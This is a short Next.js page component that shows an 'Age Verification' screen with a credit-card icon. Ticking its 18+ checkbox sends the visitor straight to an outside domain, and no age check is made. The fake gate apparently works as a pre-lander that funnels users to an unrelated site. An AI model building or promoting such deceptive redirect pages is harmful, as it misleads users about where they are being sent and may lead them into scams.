"use client"

import { useState, useEffect } from "react"
import styles from "./page.module.css"
import { CreditCard } from "lucide-react"

export default function Home() {
  const [isChecked, setIsChecked] = useState(false)
  const [mounted, setMounted] = useState(false)

  useEffect(() => {
    setMounted(true)
  }, [])

  const handleCheckboxChange = () => {
    setIsChecked(!isChecked)
    if (!isChecked) {
      window.location.href = "https://techwave.us.kg"
    }
  }

  if (!mounted) {
    return null
  }

  return (
    <main className={styles.main}>
      <div className={styles.logo}>
        <CreditCard className={styles.cardIcon} />
      </div>
      <div className={styles.content}>
        <h1>Age Verification</h1>
        <p>Please confirm your age to continue.</p>
        <label className={styles.checkbox}>
          <input type="checkbox" checked={isChecked} onChange={handleCheckboxChange} />
          <span className={styles.checkmark}></span>
          <span className={styles.checkboxText}>Tap to continue if you're 18+</span>
        </label>
      </div>
      <div className={styles.animation}>
        <div className={styles.circle}></div>
        <div className={styles.circle}></div>
        <div className={styles.circle}></div>
      </div>
    </main>
  )
}

